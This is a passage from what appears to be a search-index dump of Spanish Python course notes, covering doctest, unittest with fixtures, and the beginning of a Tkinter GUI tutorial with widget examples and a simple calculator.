de ser una aserci\u00f3n es otro error. Vamos a crear una prueba unitaria muy sencilla para ver su funcionamiento en un script tests.py : import unittest class Pruebas ( unittest . TestCase ): def test ( self ): pass if __name__ == \"__main__\" : unittest . main () En este sencillo ejemplo podemos observar como heredamos de la clase unittest.TestCase para crear una bater\u00eda de pruebas. Cada m\u00e9todo dentro de esta clase ser\u00e1 una prueba, que en nuestro ejemplo no lanza ninguna excepci\u00f3n ni error, porlo que significa que los tests pasar\u00e1n correctamente, y finalmente ejecutamos el m\u00e9todo main() para ejecutar todas las bater\u00edas: ---------------------------------------------------------------------- Ran 1 test in 0.000 s OK Como vemos se ha 1 realizado 1 test y el resultado a sido OK. Si en lugar de pasar, invocamos una execepci\u00f3n AssertError... import unittest class Pruebas ( unittest . TestCase ): def test ( self ): raise AssertionError () if __name__ == \"__main__\" : unittest . main () Entonces el test fallar\u00eda: F ====================================================================== FAIL : test ( __main__ . Pruebas ) ---------------------------------------------------------------------- Traceback ( most recent call last ): File \"C:\\Users\\Hector\\Desktop \\t est.py\" , line 5 , in test raise AssertionError () AssertionError ---------------------------------------------------------------------- Ran 1 test in 0.000 s FAILED ( failures = 1 ) En el supuesto caso que dentro del test diera un error no asertivo, entonces tendr\u00edamos un Error: import unittest class Pruebas ( unittest . TestCase ): def test ( self ): 1 / 0 if __name__ == \"__main__\" : unittest . main () Entonces el test fallar\u00eda: E ====================================================================== ERROR : test ( __main__ . Pruebas ) ---------------------------------------------------------------------- Traceback ( most recent call last ): File \"C:\\Users\\Hector\\Desktop \\t est.py\" , line 5 , in test 1 / 0 ZeroDivisionError : division by zero ---------------------------------------------------------------------- Ran 1 test in 0.001 s FAILED ( errors = 1 ) Excepciones Asertivas Con lo que sabemos podr\u00edamos crear tests complejos sirvi\u00e9ndonos de condiciones y excepciones AssertionError , pero la clase TestCase nos provee de un mont\u00f3n de alternativas. Vamos a hacer un repaso de las m\u00e1s comunes, recordad que siempre devolver\u00e1n True o False dependiendo de si pasan o no el test: Si os interesa profundizar os dejo el enlace oficial: https://docs.python.org/3/library/unittest.html Vamos a hacer algunos ejemplos para practicar. Funciones propias import unittest def doblar ( a ): return a * 2 def sumar ( a , b ): return a + b def es_par ( a ): return 1 if a % 2 == 0 else 0 class PruebasFunciones ( unittest . TestCase ): def test_doblar ( self ): self . assertEqual ( doblar ( 10 ), 20 ) self . assertEqual ( doblar ( 'Ab' ), 'AbAb' ) def test_sumar ( self ): self . assertEqual ( sumar ( - 15 , 15 ), 0 ) self . assertEqual ( sumar ( 'Ab' , 'cd' ), 'Abcd' ) def test_es_par ( self ): self . assertEqual ( es_par ( 11 ), False ) self . assertEqual ( es_par ( 68 ), True ) if __name__ == '__main__' : unittest . main () Resultado: ... ---------------------------------------------------------------------- Ran 3 tests in 0 .000s OK M\u00e9todos de cadenas import unittest class PruebasMetodosCadenas ( unittest . TestCase ): def test_upper ( self ): self . assertEqual ( 'hola' . upper (), 'HOLA' ) def test_isupper ( self ): self . assertTrue ( 'HOLA' . isupper ()) self . assertFalse ( 'Hola' . isupper ()) def test_split ( self ): s = 'Hola mundo' self . assertEqual ( s . split (), [ 'Hola' , 'mundo' ]) if __name__ == '__main__' : unittest . main () Resultado: ... ---------------------------------------------------------------------- Ran 3 tests in 0 .000s OK Preparaci\u00f3n y limpieza Lo \u00faltimo importante a comentar es que la clase TestCase incorpora dos m\u00e9todos extras. El primero es setUp() y sirve para preparar el contexto de las pruebas, por ejemplo para escribir unos valores de prueba en un fichero conectarse a un servidor o a una base de datos. Luego tendr\u00edamos tearDown() para hacer lo propio con la limpieza, borrar el fichero, desconectarse del servidor o borrar las entradas de prueba de la base de datos. Este proceso de preparar el contexto se conoce como test fixture o accesorios de prueba. S\u00f3lo por poner un ejemplo supongamos que necesitamos contar con una lista de elementos para realizar una serie de pruebas: import unittest def doblar ( a ): return a * 2 class PruebaTestFixture ( unittest . TestCase ): def setUp ( self ): print ( \"Preparando el contexto\" ) self . numeros = [ 1 , 2 , 3 , 4 , 5 ] def test ( self ): print ( \"Realizando una prueba\" ) r = [ doblar ( n ) for n in self . numeros ] self . assertEqual ( r , [ 2 , 4 , 6 , 8 , 10 ]) def tearDown ( self ): print ( \"Destruyendo el contexto\" ) del ( self . numeros ) if __name__ == '__main__' : unittest . main () Resultado de la prueba: Preparando el contexto . Realizando una prueba Destruyendo el contexto ---------------------------------------------------------------------- Ran 1 test in 0 .000s OK Y con esto finalizamos el tema. Ahora ya sabemos c\u00f3mo documentar nuestro c\u00f3digo docstrings , generar la documentaci\u00f3n con pydoc , introducir pruebas en las docstrings combinando doctest , y crear pruebas avanzadas con el m\u00f3dulo unittest . Estamos a un paso de finalizar con el curso, s\u00f3lo nos falta ver c\u00f3mo distribuir nuestros m\u00f3dulos y programas. \u00a1Nos vemos en la pr\u00f3xima unidad!","title":"Test"},{"location":"lenguajes/python3/apuntes-test/#test","text":"","title":"Test"},{"location":"lenguajes/python3/apuntes-test/#doctest","text":"Si por un lado las docstrings nos permit\u00edan describir documentaci\u00f3n, los doctest nos permiten combinar pruebas en la propia documentaci\u00f3n. Este concepto de integrar las pruebas en la documentaci\u00f3n nos ayuda a mantener las pruebas actualizadas, y adem\u00e1s nos sirve como ejemplo de utilizaci\u00f3n del c\u00f3digo, ayud\u00e1ndonos a explicar su prop\u00f3sito. Para utilizar doctests hay que inidicar una l\u00ednea dentro de la documentaci\u00f3n de la siguiente forma: >>> De esta Python entender\u00e1 que debe ejecutar el contenido dentro del comentario como si fuera c\u00f3digo normal, y lo har\u00e1 hasta que encuentre una l\u00ednea en blanco (o llegue al final de la documentaci\u00f3n). La mejor forma de ver a doctest en acci\u00f3n.","title":"Doctest"},{"location":"lenguajes/python3/apuntes-test/#definiendo-pruebas","text":"Por regla general cada prueba va ligada a una funcionalidad, pueden ser funciones, clases o sus m\u00e9todos. Por ejemplo, dada una funci\u00f3n suma ... def suma ( a , b ): \"\"\"Esta funci\u00f3n recibe dos par\u00e1metros y devuelve la suma de ambos\"\"\" return a + b Para realizar una prueba dentro de la funci\u00f3n, vamos a ejecutar un c\u00f3digo de prueba de la propia suma: def suma ( a , b ): \"\"\"Esta funci\u00f3n recibe dos par\u00e1metros y devuelve la suma de ambos >>> suma(5,10) \"\"\" return a + b Bien, ya tenemos la prueba, pero ahora nos falta indicarle a doctest cu\u00e1l es el resultado que deber\u00eda devolver la prueba, y eso lo indicaremos en la siguiente l\u00ednea: >>> def suma ( a , b ): \"\"\"Esta funci\u00f3n recibe dos par\u00e1metros y devuelve la suma de ambos >>> suma(5,10) 15 \"\"\" return a + b \u00a1Muy bien! Ahora tenemos que ejecutar la pruebas y ver si funciona o no, pero antes tenemos que adaptar el c\u00f3digo.","title":"Definiendo pruebas"},{"location":"lenguajes/python3/apuntes-test/#ejecutando-pruebas-en-un-modulo","text":"Para ejecutar pruebas tendremos que utilizar la terminal, as\u00ed vamos a guardar la funci\u00f3n en un script test.py como si fuera un m\u00f3dulo con funciones. Ahora justo al final indicaremos que se ejecten las pruebas doctest de las funciones del m\u00f3dulo escribiendo el siguiente c\u00f3digo abajo del todo: import doctest doctest . testmod () # Notar que mod significa m\u00f3dulo Esto ser\u00eda suficiente, pero con el objetivo de evitar que este c\u00f3digo se ejecute al importarlo desde otro lugar, se suele indicar de la siguiente forma: if __name__ == \"__main__\" : import doctest doctest . testmod () As\u00ed \u00fanicamente se lanzar\u00e1n las pruebas al ejecutar directamente el m\u00f3dulo, y ya podremos ejecutar el m\u00f3dulo desde la terminal: python test.py Como resultado veremos que no se muestra nada. Eso no significa que no se ejecute nuestra prueba, sino que esta ha funcionado correctamente y no hay fallos. Si queremos podemos mostrar todo el registro de ejecuci\u00f3n pasando un argumento -v a python justo al final: python test.py -v Y entonces veremos el siguiente resultado: Trying: suma ( 5 ,10 ) Expecting: 15 ok 1 items had no tests: __main__ 1 items passed all tests: 1 tests in __main__.suma 1 tests in 2 items. 1 passed and 0 failed. Test passed. En el que se prueba el c\u00f3digo suma(5,10), se espera 15 y el resultado es ok; un resumen y finalmente Test passed.","title":"Ejecutando pruebas en un m\u00f3dulo"},{"location":"lenguajes/python3/apuntes-test/#creando-varias-pruebas","text":"Evidentemente podemos definir m\u00faltiples pruebas. Probemos tambi\u00e9n alguna que sabemos que es incorrecta: def suma ( a , b ): \"\"\"Esta funci\u00f3n recibe dos par\u00e1metros y devuelve la suma de ambos >>> suma(5,10) 15 >>> suma(0,0) 1 >>> suma(-5,7) 2 \"\"\" return a + b Ahora, si ejecutamos el script de forma normal... python test.py A diferencia que antes s\u00ed que nos muestra algo, indic\u00e1ndonos que uno de los tests a fallado: ********************************************************************** File \"test.py\" , line 7 , in __main__.suma Failed example: suma ( 0 ,0 ) Expected: 1 Got: 0 ********************************************************************** 1 items had failures: 1 of 3 in __main__.suma ***Test Failed*** 1 failures. La cuesti\u00f3n ahora ser\u00eda revisar el test si es incorrecto, o adaptar la funci\u00f3n para que devuelve el resultado esperado en el test. Evidentemente en este caso hemos hecho un test incorrecto a prop\u00f3sito as\u00ed que simplemente lo borrar\u00edamos.","title":"Creando varias pruebas"},{"location":"lenguajes/python3/apuntes-test/#tests-avanzados","text":"Hasta ahora hemos hecho unos tests muy simples, pero los doctests son muy flexibles. Algunas de sus funcionalidades interesantes son la posibilidad de ejecutar bloques de c\u00f3digo o la captura de excepciones. Para crear un test que incluya un bloque de c\u00f3digo, debemos utilizar las sentencias anidadas para simular tabulaciones: ... def doblar ( lista ): \"\"\"Dobla el valor de los elementos de una lista >>> l = [1, 2, 3, 4, 5] >>> doblar(l) [2, 4, 6, 8, 10] \"\"\" return [ n * 2 for n in lista ] En este caso hemos creado la lista del test manualmente, pero podr\u00edamos generarla con un bucle utilizando sentencias anidadas: def doblar ( lista ): \"\"\"Dobla el valor de los elementos de una lista >>> l = [1, 2, 3, 4, 5] >>> doblar(l) [2, 4, 6, 8, 10] >>> l = [] >>> for i in range(10): ... l.append(i) >>> doblar(l) [0, 2, 4, 6, 8, 10, 12, 14, 16, 18] \"\"\" return [ n * 2 for n in lista ] Si ejecutamos el script monitorizando todo: python test.py -v Podemos observar la ejecuci\u00f3n del test avanzado: Trying: l = [ 1 , 2 , 3 , 4 , 5 ] Expecting nothing ok Trying: doblar ( l ) Expecting: [ 2 , 4 , 6 , 8 , 10 ] ok Trying: l = [] Expecting nothing ok Trying: for i in range ( 10 ) : l.append ( i ) Expecting nothing ok Trying: doblar ( l ) Expecting: [ 0 , 2 , 4 , 6 , 8 , 10 , 12 , 14 , 16 , 18 ] ok 1 items had no tests: __main__ 1 items passed all tests: 5 tests in __main__.doblar 5 tests in 2 items. 5 passed and 0 failed. Test passed. Por \u00faltimo vamos a volver a nuestra funci\u00f3n suma para tratar excepciones dentro de los tests. def suma ( a , b ): \"\"\"Esta funci\u00f3n recibe dos par\u00e1metros y devuelve la suma de ambos Pueden ser n\u00fameros: >>> suma(5,10) 15 >>> suma(-5,7) 2 Cadenas de texto: >>> suma('aa','bb') 'aabb' O listas: >>> a = [1, 2, 3] >>> b = [4, 5, 6] >>> suma(a,b) [1, 2, 3, 4, 5, 6] \"\"\" return a + b Ahora sabemos que no podemos sumar tipos distintos, \u00bfc\u00f3mo podemos tenerlo en cuenta en un test? Pues por ahora podemos suponer un resultado y comprobar el resultado cuando falle: >>> suma ( 10 , \"hola\" ) \"10hola\" def suma ( a , b ): \"\"\"Esta funci\u00f3n recibe dos par\u00e1metros y devuelve la suma de ambos Pueden ser n\u00fameros: >>> suma(5,10) 15 >>> suma(-5,7) 2 Cadenas de texto: >>> suma('aa','bb') 'aabb' O listas: >>> a = [1, 2, 3] >>> b = [4, 5, 6] >>> suma(a,b) [1, 2, 3, 4, 5, 6] Sin embargo no podemos sumar elementos de tipos diferentes: >>> suma(10,\"hola\") \"10hola\" \"\"\" return a + b Si ejecutamos el script monitorizando todo: python test.py -v Podemos observar el fallo: Trying: suma ( 5 ,10 ) Expecting: 15 ok Trying: suma ( -5,7 ) Expecting: 2 ok Trying: suma ( 'aa' , 'bb' ) Expecting: 'aabb' ok Trying: a = [ 1 , 2 , 3 ] Expecting nothing ok Trying: b = [ 4 , 5 , 6 ] Expecting nothing ok Trying: suma ( a,b ) Expecting: [ 1 , 2 , 3 , 4 , 5 , 6 ] ok Trying: suma ( 10 , \"hola\" ) Expecting: \"10hola\" ********************************************************************** File \"test.py\" , line 26 , in __main__.suma Failed example: suma ( 10 , \"hola\" ) Exception raised: Traceback ( most recent call last ) : File \"C:\\Program Files\\Anaconda3\\lib\\doctest.py\" , line 1321 , in __run compileflags, 1 ) , test.globs ) File \"<doctest __main__.suma[6]>\" , line 1 , in <module> suma ( 10 , \"hola\" ) File \"test.py\" , line 29 , in suma return a+b TypeError: unsupported operand type ( s ) for +: 'int' and 'str' 1 items had no tests: __main__ ********************************************************************** 1 items had failures: 1 of 7 in __main__.suma 7 tests in 2 items. 6 passed and 1 failed. ***Test Failed*** 1 failures. Concretamente debemos fijarnos en la primera l\u00ednea y \u00faltima de la excepci\u00f3n: Traceback ( most recent call last ) : ... TypeError: unsupported operand type ( s ) for +: 'int' and 'str' Y precisamente esto es lo que tenemos que indicar en el test: def suma ( a , b ): \"\"\"Esta funci\u00f3n recibe dos par\u00e1metros y devuelve la suma de ambos Pueden ser n\u00fameros: >>> suma(5,10) 15 >>> suma(-5,7) 2 Cadenas de texto: >>> suma('aa','bb') 'aabb' O listas: >>> a = [1, 2, 3] >>> b = [4, 5, 6] >>> suma(a,b) [1, 2, 3, 4, 5, 6] Sin embargo no podemos sumar elementos de tipos diferentes: >>> suma(10,\"hola\") Traceback (most recent call last): ... TypeError: unsupported operand type(s) for +: 'int' and 'str' \"\"\" return a + b Y con esto acabamos esta lecci\u00f3n en la que hemos visto como crear tests sencillos en la documentaci\u00f3n con doctest . En la siguiente veremos un tipo distinto de tests m\u00e1s avanzados, los tests unitarios o Unittest .","title":"Tests avanzados"},{"location":"lenguajes/python3/apuntes-test/#unittest","text":"El m\u00f3dulo unittest , a veces referido como PyUnit , forma parte de una serie de frameworks conocidos como xUnit . Estas librer\u00edas se encuentran en la mayor\u00eda de lenguajes y son casi un est\u00e1ndard a la hora de programar pruebas unitarias. A diferencia de doctest , unittest ofrece la posibilidad de crear las pruebas en el propio c\u00f3digo implementando una clase llamada unittest.TestCase en la que se incluir\u00e1 un kit o bater\u00eda de pruebas . Cada una de las pruebas puede devolver tres respuestas en funci\u00f3n del resultado: OK : Para indicar que la prueba se ha pasado \u00e9xitosamente. FAIL : Para indicar que la prueba no ha pasado \u00e9xitosamente lanzaremos una excepci\u00f3n AssertionError (sentencia verdadero-falso) ERROR : Para indicar que la prueba no ha pasado \u00e9xitosamente, pero el resultado en lugar de ser una aserci\u00f3n es otro error. Vamos a crear una prueba unitaria muy sencilla para ver su funcionamiento en un script tests.py : import unittest class Pruebas ( unittest . TestCase ): def test ( self ): pass if __name__ == \"__main__\" : unittest . main () En este sencillo ejemplo podemos observar como heredamos de la clase unittest.TestCase para crear una bater\u00eda de pruebas. Cada m\u00e9todo dentro de esta clase ser\u00e1 una prueba, que en nuestro ejemplo no lanza ninguna excepci\u00f3n ni error, porlo que significa que los tests pasar\u00e1n correctamente, y finalmente ejecutamos el m\u00e9todo main() para ejecutar todas las bater\u00edas: ---------------------------------------------------------------------- Ran 1 test in 0.000 s OK Como vemos se ha 1 realizado 1 test y el resultado a sido OK. Si en lugar de pasar, invocamos una execepci\u00f3n AssertError... import unittest class Pruebas ( unittest . TestCase ): def test ( self ): raise AssertionError () if __name__ == \"__main__\" : unittest . main () Entonces el test fallar\u00eda: F ====================================================================== FAIL : test ( __main__ . Pruebas ) ---------------------------------------------------------------------- Traceback ( most recent call last ): File \"C:\\Users\\Hector\\Desktop \\t est.py\" , line 5 , in test raise AssertionError () AssertionError ---------------------------------------------------------------------- Ran 1 test in 0.000 s FAILED ( failures = 1 ) En el supuesto caso que dentro del test diera un error no asertivo, entonces tendr\u00edamos un Error: import unittest class Pruebas ( unittest . TestCase ): def test ( self ): 1 / 0 if __name__ == \"__main__\" : unittest . main () Entonces el test fallar\u00eda: E ====================================================================== ERROR : test ( __main__ . Pruebas ) ---------------------------------------------------------------------- Traceback ( most recent call last ): File \"C:\\Users\\Hector\\Desktop \\t est.py\" , line 5 , in test 1 / 0 ZeroDivisionError : division by zero ---------------------------------------------------------------------- Ran 1 test in 0.001 s FAILED ( errors = 1 )","title":"Unittest"},{"location":"lenguajes/python3/apuntes-test/#excepciones-asertivas","text":"Con lo que sabemos podr\u00edamos crear tests complejos sirvi\u00e9ndonos de condiciones y excepciones AssertionError , pero la clase TestCase nos provee de un mont\u00f3n de alternativas. Vamos a hacer un repaso de las m\u00e1s comunes, recordad que siempre devolver\u00e1n True o False dependiendo de si pasan o no el test: Si os interesa profundizar os dejo el enlace oficial: https://docs.python.org/3/library/unittest.html Vamos a hacer algunos ejemplos para practicar.","title":"Excepciones Asertivas"},{"location":"lenguajes/python3/apuntes-test/#funciones-propias","text":"import unittest def doblar ( a ): return a * 2 def sumar ( a , b ): return a + b def es_par ( a ): return 1 if a % 2 == 0 else 0 class PruebasFunciones ( unittest . TestCase ): def test_doblar ( self ): self . assertEqual ( doblar ( 10 ), 20 ) self . assertEqual ( doblar ( 'Ab' ), 'AbAb' ) def test_sumar ( self ): self . assertEqual ( sumar ( - 15 , 15 ), 0 ) self . assertEqual ( sumar ( 'Ab' , 'cd' ), 'Abcd' ) def test_es_par ( self ): self . assertEqual ( es_par ( 11 ), False ) self . assertEqual ( es_par ( 68 ), True ) if __name__ == '__main__' : unittest . main () Resultado: ... ---------------------------------------------------------------------- Ran 3 tests in 0 .000s OK","title":"Funciones propias"},{"location":"lenguajes/python3/apuntes-test/#metodos-de-cadenas","text":"import unittest class PruebasMetodosCadenas ( unittest . TestCase ): def test_upper ( self ): self . assertEqual ( 'hola' . upper (), 'HOLA' ) def test_isupper ( self ): self . assertTrue ( 'HOLA' . isupper ()) self . assertFalse ( 'Hola' . isupper ()) def test_split ( self ): s = 'Hola mundo' self . assertEqual ( s . split (), [ 'Hola' , 'mundo' ]) if __name__ == '__main__' : unittest . main () Resultado: ... ---------------------------------------------------------------------- Ran 3 tests in 0 .000s OK","title":"M\u00e9todos de cadenas"},{"location":"lenguajes/python3/apuntes-test/#preparacion-y-limpieza","text":"Lo \u00faltimo importante a comentar es que la clase TestCase incorpora dos m\u00e9todos extras. El primero es setUp() y sirve para preparar el contexto de las pruebas, por ejemplo para escribir unos valores de prueba en un fichero conectarse a un servidor o a una base de datos. Luego tendr\u00edamos tearDown() para hacer lo propio con la limpieza, borrar el fichero, desconectarse del servidor o borrar las entradas de prueba de la base de datos. Este proceso de preparar el contexto se conoce como test fixture o accesorios de prueba. S\u00f3lo por poner un ejemplo supongamos que necesitamos contar con una lista de elementos para realizar una serie de pruebas: import unittest def doblar ( a ): return a * 2 class PruebaTestFixture ( unittest . TestCase ): def setUp ( self ): print ( \"Preparando el contexto\" ) self . numeros = [ 1 , 2 , 3 , 4 , 5 ] def test ( self ): print ( \"Realizando una prueba\" ) r = [ doblar ( n ) for n in self . numeros ] self . assertEqual ( r , [ 2 , 4 , 6 , 8 , 10 ]) def tearDown ( self ): print ( \"Destruyendo el contexto\" ) del ( self . numeros ) if __name__ == '__main__' : unittest . main () Resultado de la prueba: Preparando el contexto . Realizando una prueba Destruyendo el contexto ---------------------------------------------------------------------- Ran 1 test in 0 .000s OK Y con esto finalizamos el tema. Ahora ya sabemos c\u00f3mo documentar nuestro c\u00f3digo docstrings , generar la documentaci\u00f3n con pydoc , introducir pruebas en las docstrings combinando doctest , y crear pruebas avanzadas con el m\u00f3dulo unittest . Estamos a un paso de finalizar con el curso, s\u00f3lo nos falta ver c\u00f3mo distribuir nuestros m\u00f3dulos y programas. \u00a1Nos vemos en la pr\u00f3xima unidad!","title":"Preparaci\u00f3n y limpieza"},{"location":"lenguajes/python3/apuntes-tkinter/","text":"Tkinter Tkinter es una libreria de python para crear programas con interficies graficas. !> Los programas se crean en archivos *.py , al ejecutarse se abre una terminal m\u00e1s el programa. Para evitar eso lo guardare en *.pyw , as\u00ed solo abrira el programa. Raiz Es la ventana principal del programa. from tkinter import * # creo la raiz root = Tk () # Titulo root . title ( \"Hola mundo\" ) # bucle mantiene la app ( siempre abajo del todo ) root . mainloop () Resizable Permite establecer los parametros de agrandar o enpeque\u00f1ecer la ventna o simplemente dejarla fija. # Poder agrandar ventana (anchura, altura) 0 = false, 1 = true root . resizable ( 1 , 1 ) # 1,1 movible. 0,0 fija Iconbitmap A\u00f1ade un icono en la ventana root . iconbitmap ( '@hola.xbm' ) Ejemplo configurando lo mas b\u00e1sico, la raiz con un titulo y ventana redimensionable. tk.py from tkinter import * # creo la raiz root = Tk () # Titulo root . title ( \"Hola mundo\" ) # Poder agrandar ventana (anchura, altura) 0 = false, 1 = true root . resizable ( 1 , 1 ) # bucle mantiene la app ( siempre abajo del todo ) root . mainloop () As\u00ed se muestra de tk.pyw Frame (Marco) Los frames son marcos contenedores de otros widgets. Pueden tener tama\u00f1o propio y posicionarse en distintos lugares de otro contenedor ( ya sea la raiz u otro marco ). from tkinter import * root = Tk () # Hijo de root, no ocurre nada frame = Frame ( root ) # Empaqueta el frame en la ra\u00edz frame . pack () # Como no tenemos ning\u00fan elemento dentro del frame, # no tiene tama\u00f1o y aparece ocupando lo m\u00ednimo posible, 0*0 px # Color de fondo, background frame . config ( bg = \"lightblue\" ) # Podemos establecer un tama\u00f1o, # la ra\u00edz se adapta al frame que contiene frame . config ( width = 480 , height = 320 ) root . mainloop () .Conf (Estilismo) config a\u00f1ade distintas configuraciones al los frames o la ra\u00edz. . config ( width = 480 , height = 320 ) # Podemos establecer un tama\u00f1o . config ( cursor = \"\" ) # Tipo de cursor . config ( relief = \"sunken\" ) # relieve del frame hundido . config ( bd = 25 ) # tama\u00f1o del borde en p\u00edxeles . config ( bg = \"blue\" ) # color de fondo, background . config ( cursor = \"pirate\" ) # tipo de cursor (arrow defecto) . config ( relief = \"sunken\" ) # relieve del root . config ( bd = 25 ) # tama\u00f1o del borde en p\u00edxeles . config ( font = ( \"Consolas\" , 24 )) # tipo de letra . config ( fg = 'blue' ) # color de letra . config ( padx = 10 ) # padding x . config ( pady = 10 ) # padding y .Pack (Posicionamiento) Pack() enpaqueta los frames y los muestra en la ventana. frame . pack ( side = \"right\" ) # a la derecha al medio frame . pack ( anchor = \"se\" ) # sudeste, abajo a la derecha frame . pack ( fill = \"x\" ) # ancho como el padre frame . pack ( fill = \"y\" ) # alto como el padre frame . pack ( fill = \"both\" ) # ambas opciones frame . pack ( fill = \"both\" , expand = 1 ) # expandirse para ocupar el espacio Ejemplo empacando frame en sud-este de la raiz. from tkinter import * root = Tk () # RAIZ root . title ( \"Hola mundo\" ) # Titulo # Poder agrandar ventana (anchura, altura) 0 = false, 1 = true root . resizable ( 1 , 1 ) # Frame ( Marco ) frame = Frame ( root ) frame . pack ( side = 'right' , anchor = 'se' ) # pegado a la derecha y posici\u00f3n se # lo mas abitual es utilizat (fill='both', expand=1) adaptarse a la ventana. frame . config ( width = 280 , height = 120 ) # tama\u00f1o inicial frame . config ( bg = \"lightblue\" ) # fondo frame . config ( bd = 10 ) # borde frame . config ( relief = \"sunken\" ) # stilo de borde frame . config ( cursor = \"pirate\" ) # cambio de cursor # bucle aplicaci\u00f3n root . mainloop () Label El widget Label se utiliza para mostrar textos, suelen ser est\u00e1ticos de ah\u00ed su nombre. from tkinter import * root = Tk () frame = Frame ( root ) frame . pack () label = Label ( frame , text = \"\u00a1Hola Mundo!\" ) label . pack () root . mainloop () Creando m\u00e1s etiquetas. from tkinter import * root = Tk () Label ( root , text = \"\u00a1Hola Mundo!\" ) . pack () Label ( root , text = \"\u00a1Otra etiqueta!\" ) . pack () Label ( root , text = \"\u00a1\u00daltima etiqueta!\" ) . pack () root . mainloop () Posicionando etiquetas. Label ( root , text = \"\u00a1Hola Mundo!\" ) . pack ( anchor = 'nw' ) Label ( root , text = \"\u00a1Otra etiqueta!\" ) . pack ( anchor = 'center' ) Label ( root , text = \"\u00a1\u00daltima etiqueta!\" ) . pack ( anchor = 'se' ) Label ( root , text = \"\u00a1Hola mundo!\" ) . place ( x = 10 , y = 10 ) # x, y cordenadas place posiciona por coordenadas respecto al padre. Texto en variable # # variable dinamica texto = StringVar () texto . set ( \"un nuevo texto\" ) # texto nuevo label = Label ( root , text = \"Linea inicial del texto\" ) label . pack ( anchor = \"center\" ) # Cambio el texto a el label label . config ( textvariable = texto ) Es un ejemplo un poco absurdo, pero quer\u00eda remarcar que el texto se puede asignar a una variable. Imagen # A\u00f1adir imagen imagen = PhotoImage ( file = \"hola.png\" ) # acepta .png y .gif Label ( root , image = imagen , bd = 0 ) . pack () Para trabajar con otro tipo de formato se a de trabajar con un m\u00f3dulo externo como PIL. Entry Widget Entry (texto corto), son lo que en python un input() donde el usuario inserta un peque\u00f1o campo de texto. from tkinter import * root = Tk () # Entrada de texto, un input Entry ( root ) . pack ( side = \"right\" ) # label del campo de texto Label ( root , text = \"Nombre\" ) . pack ( side = \"left\" ) root . mainloop () En el caso anterior si a\u00f1adiera otro campo de texto se mostrar\u00eda en la misma l\u00ednea, eso pasa porque pack() intenta alinear autom\u00e1ticamente, pero no hace milagros. Para solucionarlo creo 2 frames ( marcos) en cada uno de ellos ira su campo de texto as\u00ed se mostraran en 2 lineas # marco 1 linea 1 frame = Frame ( root ) frame . pack () # Entrada de texto, un input 1 entry = Entry ( frame ) entry . pack ( side = \"right\" ) # label del campo de texto 2 label1 = Label ( frame , text = \"Nombre\" ) label1 . pack ( side = \"left\" ) # marco 2 linea 2 frame2 = Frame ( root ) frame2 . pack () # Entrada de texto, un input 2 entry2 = Entry ( frame2 ) entry2 . pack ( side = \"right\" ) # label del campo de texto 2 label2 = Label ( frame2 , text = \"Apellido\" ) label2 . pack ( side = \"left\" ) Aun as\u00ed como nombre y apellidos no tienen los mismos caracteres no queda perfecto, utilizare .grid() para alinear como si fuera una tabla. .grid (tabla) Widget Grid simula una tabla para poder encuadrar, obviamente tiene configuraciones propias . . grid ( row = 0 ) # numero de fila . grid ( column = 0 ) # numero de columna . grid ( sticky = 'w' ) # pegado e, s, w, o . grid ( state = 'disabled' ) # estado disable, normal . grid ( show = '*' ) # muestra, para contrase\u00f1as . grid ( justify = 'center' ) #justifica el texto. center, left, right Padding es un par\u00e1metro que esta en todos los widgets. . grid ( padx = 5 ) # pading vertical . grid ( pady = 5 ) # pading horizontal Ejemplo de dos entradas bien alineadas con grid. from tkinter import * root = Tk () # label del campo de texto 1 label1 = Label ( root , text = \"Nombre\" ) label1 . grid ( row = 0 , column = 0 , sticky = \"w\" , padx = 5 , pady = 5 ) # campo de texto 1 entry = Entry ( root ) entry . grid ( row = 0 , column = 1 , padx = 5 , pady = 5 ) # Puedo justificar el texto del input para que vempiece a escribir desde centro derecha o izquierda con justify # O desabilitar el campo con state \"disable\" o \"normal\" entry . config ( justify = \"right\" , state = \"disable\" ) # label del campo de texto 2 label2 = Label ( root , text = \"Contrase\u00f1a\" ) label2 . grid ( row = 1 , column = 0 , sticky = \"w\" , padx = 5 , pady = 5 ) # campo de texto 2 entry2 = Entry ( root ) entry2 . grid ( row = 1 , column = 1 , padx = 5 , pady = 5 ) # Tambi\u00e9n puedo mostrar un caracter especial mientras escribes una contrase\u00f1a entry2 . config ( justify = \"center\" , show = \"*\" ) root . mainloop () Text ( texto largo ) Se explica por si solo, un campo de texto donde puedes escribir tanto como te venga en gana. from tkinter import * root = Tk () texto = Text ( root ) texto . pack () root . mainloop () Por defecto ocupa un espacio predefinido, pero puedes definir un tama\u00f1o concreto y alguna que otra configuraci\u00f3n. texto . config ( width = 50 , height = 10 ) # tama\u00f1o en caracteres texto . config ( font = ( \"Consolas\" , 12 )) # fuente texto . config ( padx = 10 , pady = 10 ) # padding, para que el texto no este muy al borde texto . config ( selectbackground = \"orange\" ) # color de selecci\u00f3n del texto Ejemplo campo de texto. from tkinter import * root = Tk () # asigno Text a una variable para poder configurar facilmente texto = Text ( root ) texto . pack () texto . config ( width = 50 , height = 10 ) # width=50 es igual a 50 caracteres de ancho, no pixeles texto . config ( font = ( \"Consolas\" , 12 )) # Cambio fuente del campo texto . config ( padx = 10 , pady = 10 ) # le a\u00f1ado un pading texto . config ( selectbackground = \"orange\" ) # Cambio el color de selecci\u00f3n del texto root . mainloop () Button Un bot\u00f3n clicable que se le puede asignar una acci\u00f3n. from tkinter import * # Definimos una funci\u00f3n a ejecutar al clic el bot\u00f3n def hola (): print ( \"Hola mundo!\" ) root = Tk () # Enlezamos la funci\u00f3n a la acci\u00f3n del bot\u00f3n Button ( root , text = \"Cl\u00edcame\" , command = hola ) . pack () root . mainloop () El concepto es muy simple, pero es algo muy \u00fatil en interficies gr\u00e1ficas. El siguiente c\u00f3digo es de una calculadora muy salchichera, como ejemplo es v\u00e1lido. # calculadora cutre que suma, resta o multiplica 2 n\u00fameros from tkinter import * # funciones que hacen las operaci\u00f3nes y asignan el resultado. # Al recibir estrings los calculo cambiando la variable a float def sumar (): result . set ( float ( n1 . get ()) + float ( n2 . get ()) ) borrar () def restar (): result . set ( float ( n1 . get ()) - float ( n2 . get ()) ) borrar () def multiplicar (): result . set ( float ( n1 . get ()) * float ( n2 . get ()) ) borrar () # funcion donde borro los strings de las barras def borrar (): n1 . set ( \"\" ) n2 . set ( \"\" ) root = Tk () # A\u00f1ado borde al frame de root por mejorar apariencia root . config ( bd = 15 ) n1 = StringVar () n2 = StringVar () result = StringVar () Label ( root , text = \"N\u00famero 1\" ) . pack () Entry ( root , justify = \"center\" , textvariable = n1 ) . pack () # entrada numero 1 Label ( root , text = \"N\u00famero 2\" ) . 